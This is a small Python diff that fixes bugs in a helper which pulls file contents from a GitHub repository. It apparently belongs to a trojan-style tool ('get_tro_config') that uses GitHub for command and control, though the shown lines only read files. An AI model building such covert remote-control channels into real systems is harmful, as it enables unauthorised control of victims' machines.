@@ -28,13 +28,13 @@ def connect_to_github():
 def get_file_contents(filepath):
 	
 	gh,repo,branch = connect_to_github()
-	tree = branch.commit.tree.recurse()
+	tree = branch.commit.commit.tree.recurse()
 	
 	for filename in tree.tree:
 		if filepath in filename.path:
 			print "[*] Found file %s" % filepath
 			blob = repo.blob(filename._json_data['sha'])
-			return blob.conent
+			return blob.content
 	return None
 
 def get_tro_config():
